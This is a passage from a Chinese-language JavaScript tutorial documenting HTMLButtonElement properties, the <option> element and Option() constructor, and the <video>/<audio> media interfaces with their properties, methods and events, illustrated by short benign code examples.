    ``HTMLButtonElement.formNoValidate`` 属性是一个布尔值，表示点击按钮提交表单时，是否要跳过表单校验的步骤。该属性可读写，一旦设置会覆盖 ``<form>`` 元素的 ``novalidate`` 属性。

   **（9）HTMLButtonElement.formTarget**

    ``HTMLButtonElement.formTarget`` 属性是一个字符串，指定了提交了表单以后，哪个窗口展示服务器返回的内容。该属性可读写，一旦设置会覆盖 ``<form>`` 元素的 ``target`` 属性。

   **（10）HTMLButtonElement.labels**

    ``HTMLButtonElement.labels`` 返回 ``NodeList`` 实例，表示那些绑定按钮的 ``<label>`` 元素。该属性只读。

   .. code:: javascript

      /* HTML 代码如下
        <label id="label1" for="test">Label 1</label>
        <button id="test">Button</button>
        <label id="label2" for="test">Label 2</label>
      */
   
      const button = document.getElementById('test');
   
      for(var i = 0; i < button.labels.length; i++) {
        console.log(button.labels[i].textContent);
      }
      // "Label 1"
      // "Label 2"

   上面代码中，两个 ``<label>`` 元素绑定 ``<button>`` 元素。 ``button.labels`` 返回这两个 ``<label>`` 元素。

   **（11）HTMLButtonElement.name**

    ``HTMLButtonElement.name`` 属性是一个字符串，表示按钮元素的 ``name`` 属性。如果没有设置 ``name`` 属性，则返回空字符串。该属性可读写。

   **（12）HTMLButtonElement.tabIndex**

    ``HTMLButtonElement.tabIndex`` 是一个整数，代表按钮元素的 Tab 键顺序。该属性可读写。

   **（13）HTMLButtonElement.type**

    ``HTMLButtonElement.type`` 属性是一个字符串，表示按钮的行为。该属性可读写，可能取以下的值。

   -  ``submit`` ：默认值，表示提交表单。
   -  ``reset`` ：重置表单。
   -  ``button`` ：没有任何默认行为。

   **（14）HTMLButtonElement.validationMessage**

    ``HTMLButtonElement.validationMessage`` 属性是一个字符串，表示没有通过校验时显示的提示信息。该属性只读。

   **（15）HTMLButtonElement.validity**

    ``HTMLButtonElement.validity`` 属性返回该按钮的校验状态（ ``ValidityState`` ）。该属性只读。

   **（16）HTMLButtonElement.value**

    ``HTMLButtonElement.value`` 属性返回该按钮绑定的值。该属性可读写。

   **（17）HTMLButtonElement.willValidate**

    ``HTMLButtonElement.willValidate`` 属性是一个布尔值，表示该按钮提交表单时是否将被校验，默认为 ``false`` 。该属性只读。

/🟠 <option> 元素
=================

    ``<option>`` 元素表示下拉框（ ``<select>`` ， ``<optgroup>`` 或 ``<datalist>`` ）里面的一个选项。它是 HTMLOptionElement 接口的实例。

属性
---

   除了继承 HTMLElement 接口的属性和方法，HTMLOptionElement 接口具有下面的属性。

   -  ``disabled`` ：布尔值，表示该项是否可选择。
   -  ``defaultSelected`` ：布尔值，表示该项是否默认选中。一旦设为 ``true`` ，该项的值就是 ``<select>`` 的默认值。
   -  ``form`` ：返回 ``<option>`` 所在的表单元素。如果不属于任何表单，则返回 ``null`` 。该属性只读。
   -  ``index`` ：整数，表示该选项在整个下拉列表里面的位置。该属性只读。
   -  ``label`` ：字符串，表示对该选项的说明。如果该属性未设置，则返回该选项的文本内容。
   -  ``selected`` ：布尔值，表示该选项是否选中。
   -  ``text`` ：字符串，该选项的文本内容。
   -  ``value`` ：字符串，该选项的值。表单提交时，上传的就是选中项的这个属性。

Option() 构造函数
----------------

   浏览器原生提供 ``Option()`` 构造函数，用来生成 HTMLOptionElement 实例。

   .. code:: javascript

      new Option(text, value, defaultSelected, selected)

   它接受四个参数，都是可选的。

   - text：字符串，表示该选项的文本内容。如果省略，返回空字符串。
   - value：字符串，表示该选项的值。如果省略，默认返回 ``text`` 属性的值。
   - defaultSelected：布尔值，表示该项是否默认选中，默认为 ``false`` 。注意，即使设为 ``true`` ，也不代表该项的 ``selected`` 属性为 ``true`` 。
   - selected：布尔值，表示该项是否选中，默认为 ``false`` 。

   .. code:: javascript

      var newOption = new Option('hello', 'world', true);
   
      newOption.text // "hello"
      newOption.value // "world"
      newOption.defaultSelected // true
      newOption.selected // false

   上面代码中， ``newOption`` 的 ``defaultSelected`` 属性为 ``true`` ，但是它没有被选中（即 ``selected`` 属性为 ``false`` ）。

/🟠 <video>，<audio>
=====================

概述
---

    ``<video>`` 元素用来加载视频，是 ``HTMLVideoElement`` 对象的实例。 ``<audio>`` 元素用来加载音频，是 ``HTMLAudioElement`` 对象的实例。而 ``HTMLVideoElement`` 和 ``HTMLAudioElement`` 都继承了 ``HTMLMediaElement`` ，所以这两个 HTML 元素有许多共同的属性和方法，可以放在一起介绍。

   理论上，这两个 HTML 元素直接用 ``src`` 属性指定媒体文件，就可以使用了。

   .. code:: html

      <audio src="background_music.mp3"/>
      <video src="news.mov" width=320 height=240/>

   注意， ``<video>`` 元素有 ``width`` 属性和 ``height`` 属性，可以指定宽和高。 ``<audio>`` 元素没有这两个属性，因为它的播放器外形是浏览器给定的，不能指定。

   实际上，不同的浏览器支持不同的媒体格式，我们不得不用 ``<source>`` 元素指定同一个媒体文件的不同格式。

   .. code:: html

      <audio id="music">
        <source src="music.mp3" type="audio/mpeg">  
        <source src="music.ogg" type='audio/ogg; codec="vorbis"'>
      </audio>

   浏览器遇到支持的格式，就会忽略后面的格式。

   这两个元素都有一个 ``controls`` 属性，只有打开这个属性，才会显示控制条。注意， ``<audio>`` 元素如果不打开 ``controls`` 属性，根本不会显示，而是直接在背景播放。

HTMLMediaElement 接口
--------------------

    ``HTMLMediaElement`` 并没有对应的 HTML 元素，而是作为 ``<video>`` 和 ``<audio>`` 的基类，定义一些它们共同的属性和方法。

    ``HTMLMediaElement`` 接口有以下属性。

   - HTMLMediaElement.audioTracks：返回一个类似数组的对象，表示媒体文件包含的音轨。
   - HTMLMediaElement.autoplay：布尔值，表示媒体文件是否自动播放，对应 HTML 属性 ``autoplay`` 。
   - HTMLMediaElement.buffered：返回一个 TimeRanges 对象，表示浏览器缓冲的内容。该对象的 ``length`` 属性返回缓存里面有多少段内容， ``start(rangeId)`` 方法返回指定的某段内容（从0开始）开始的时间点， ``end()`` 返回指定的某段内容结束的时间点。该属性只读。
   - HTMLMediaElement.controls：布尔值，表示是否显示媒体文件的控制栏，对应 HTML 属性 ``controls`` 。
   - HTMLMediaElement.controlsList：返回一个类似数组的对象，表示是否显示控制栏的某些控件。该对象包含三个可能的值： ``nodownload`` 、 ``nofullscreen`` 和 ``noremoteplayback`` 。该属性只读。
   - HTMLMediaElement.crossOrigin：字符串，表示跨域请求时是否附带用户信息（比如 Cookie），对应 HTML 属性 ``crossorigin`` 。该属性只有两个可能的值： ``anonymous`` 和 ``use-credentials`` 。
   - HTMLMediaElement.currentSrc：字符串，表示当前正在播放的媒体文件的绝对路径。该属性只读。
   - HTMLMediaElement.currentTime：浮点数，表示当前播放的时间点。
   - HTMLMediaElement.defaultMuted：布尔值，表示默认是否关闭音量，对应 HTML 属性 ``muted`` 。
   - HTMLMediaElement.defaultPlaybackRate：浮点数，表示默认的播放速率，默认是1.0。
   - HTMLMediaElement.disableRemotePlayback：布尔值，是否允许远程回放，即远程回放的时候是否会有工具栏。
   - HTMLMediaElement.duration：浮点数，表示媒体文件的时间长度（单位秒）。如果当前没有媒体文件，该属性返回0。该属性只读。
   - HTMLMediaElement.ended：布尔值，表示当前媒体文件是否已经播放结束。该属性只读。
   - HTMLMediaElement.error：返回最近一次报错的错误对象，如果没有报错，返回 ``null`` 。
   - HTMLMediaElement.loop：布尔值，表示媒体文件是否会循环播放，对应 HTML 属性 ``loop`` 。
   - HTMLMediaElement.muted：布尔值，表示音量是否关闭。
   - HTMLMediaElement.networkState：当前网络状态，共有四个可能的值。0表示没有数据；1表示媒体元素处在激活状态，但是还没开始下载；2表示下载中；3表示没有找到媒体文件。
   - HTMLMediaElement.paused：布尔值，表示媒体文件是否处在暂停状态。该属性只读。
   - HTMLMediaElement.playbackRate：浮点数，表示媒体文件的播放速度，1.0是正常速度。如果是负数，表示向后播放。
   - HTMLMediaElement.played：返回一个 TimeRanges 对象，表示播放的媒体内容。该属性只读。
   - HTMLMediaElement.preload：字符串，表示应该预加载哪些内容，可能的值为 ``none`` 、 ``metadata`` 和 ``auto`` 。
   - HTMLMediaElement.readyState：整数，表示媒体文件的准备状态，可能的值为0（没有任何数据）、1（已获取元数据）、2（可播放当前帧，但不足以播放多个帧）、3（可以播放多帧，至少为两帧）、4（可以流畅播放）。该属性只读。
   - HTMLMediaElement.seekable：返回一个 TimeRanges 对象，表示一个用户可以搜索的媒体内容范围。该属性只读。
   - HTMLMediaElement.seeking：布尔值，表示媒体文件是否正在寻找新位置。该属性只读。
   - HTMLMediaElement.src：字符串，表示媒体文件所在的 URL，对应 HTML 属性 ``src`` 。
   - HTMLMediaElement.srcObject：返回 ``src`` 属性对应的媒体文件资源，可能是 ``MediaStream`` 、 ``MediaSource`` 、 ``Blob`` 或 ``File`` 对象。直接指定这个属性，就可以播放媒体文件。
   - HTMLMediaElement.textTracks：返回一个类似数组的对象，包含所有文本轨道。该属性只读。
   - HTMLMediaElement.videoTracks：返回一个类似数组的对象，包含多有视频轨道。该属性只读。
   - HTMLMediaElement.volume：浮点数，表示音量。0.0 表示静音，1.0 表示最大音量。

    ``HTMLMediaElement`` 接口有如下方法。

   - HTMLMediaElement.addTextTrack()：添加文本轨道（比如字幕）到媒体文件。
   - HTMLMediaElement.captureStream()：返回一个 MediaStream 对象，用来捕获当前媒体文件的流内容。
   - HTMLMediaElement.canPlayType()：该方法接受一个 MIME 字符串作为参数，用来判断这种类型的媒体文件是否可以播放。该方法返回一个字符串，有三种可能的值， ``probably`` 表示似乎可播放， ``maybe`` 表示无法在不播放的情况下判断是否可播放，空字符串表示无法播放。
   - HTMLMediaElement.fastSeek()：该方法接受一个浮点数作为参数，表示指定的时间（单位秒）。该方法将媒体文件移动到指定时间。
   - HTMLMediaElement.load()：重新加载媒体文件。
   - HTMLMediaElement.pause()：暂停播放。该方法没有返回值。
   - HTMLMediaElement.play()：开始播放。该方法返回一个 Promise 对象。

   下面是 ``play()`` 方法的一个例子。

   .. code:: javascript

      var myVideo = document.getElementById('myVideoElement');
   
      myVideo
      .play()
      .then(() => {
        console.log('playing');
      })
      .catch((error) => {
        console.log(error);
      });

HTMLVideoElement 接口
--------------------

    ``HTMLVideoElement`` 接口代表了 ``<video>`` 元素。这个接口继承了 ``HTMLMediaElement`` 接口，并且有一些自己的属性和方法。

   HTMLVideoElement 接口的属性。

   - HTMLVideoElement.height：字符串，表示视频播放区域的高度（单位像素），对应 HTML 属性 ``height`` 。
   - HTMLVideoElement.width：字符串，表示视频播放区域的宽度（单位像素），对应 HTML 属性 ``width`` 。
   - HTMLVideoElement.videoHeight：该属性只读，返回一个整数，表示视频文件自身的高度（单位像素）。
   - HTMLVideoElement.videoWidth：该属性只读，返回一个整数，表示视频文件自身的宽度（单位像素）。
   - HTMLVideoElement.poster：字符串，表示一个图像文件的 URL，用来在无法获取视频文件时替代显示，对应 HTML 属性 ``poster`` 。

   HTMLVideoElement 接口的方法。

   - HTMLVideoElement.getVideoPlaybackQuality()：返回一个对象，包含了当前视频回放的一些数据。

HTMLAudioElement 接口
--------------------

    ``HTMLAudioElement`` 接口代表了 ``<audio>`` 元素。

   该接口继承了 ``HTMLMediaElement`` ，但是没有定义自己的属性和方法。浏览器原生提供一个 ``Audio()`` 构造函数，返回的就是 ``HTMLAudioElement`` 实例。

   .. code:: javascript

      var song = new Audio([URLString]);

    ``Audio()`` 构造函数接受一个字符串作为参数，表示媒体文件的 URL。如果省略这个参数，可以稍后通过 ``src`` 属性指定。

   生成 ``HTMLAudioElement`` 实例以后，不用插入 DOM，可以直接用 ``play()`` 方法在背景播放。

   .. code:: javascript

      var a = new Audio();
      if (a.canPlayType('audio/wav')) {
        a.src = 'soundeffect.wav';
        a.play();
      }

事件
---

    ``<video>`` 和 ``<audio>`` 元素有以下事件。

   - loadstart：开始加载媒体文件时触发。
   - progress：媒体文件加载过程中触发，大概是每秒触发2到8次。
   - loadedmetadata：媒体文件元数据加载成功时触发。
   - loadeddata：当前播放位置加载成功后触发。
   - canplay：已经加载了足够的数据，可以开始播放时触发，后面可能还会请求数据。
   - canplaythrough：已经加载了足够的数据，可以一直播放时触发，后面不需要继续请求数据。
   - suspend：已经缓冲了足够的数据，暂时停止下载时触发。
   - stalled：尝试加载数据，但是没有数据返回时触发。
   - play：调用 ``play()`` 方法时或自动播放启动时触发。如果已经加载了足够的数据，这个事件后面会紧跟 ``playing`` 事件，否则会触发 ``waiting`` 事件。
   - waiting：由于没有足够的缓存数据，无法播放或播放停止时触发。一旦缓冲数据足够开始播放，后面就会紧跟 ``playing`` 事件。
   - playing：媒体开始播放时触发。
   - timeupdate： ``currentTime`` 属性变化时触发，每秒可能触发4到60次。
   - pause：调用 ``pause()`` 方法、播放暂停时触发。
   - seeking：脚本或者用户要求播放某个没有缓冲的位置，播放停止开始加载数据时触发。此时， ``seeking`` 属性返回 ``true`` 。
   - seeked： ``seeking`` 属性变回 ``false`` 时触发。
   - ended：媒体文件播放完毕时触发。
   - durationchange： ``duration`` 属性变化时触发。
   - volumechange：音量变化时触发。
   - ratechange：播放速度或默认的播放速度变化时触发。
   - abort：停止加载媒体文件时触发，通常是用户主动要求停止下载。
   - error：网络或其他原因导致媒体文件无法加载时触发。
   - emptied：由于 ``error`` 或 ``abort`` 事件导致 ``networkState`` 属性变成无法获取数据时触发。

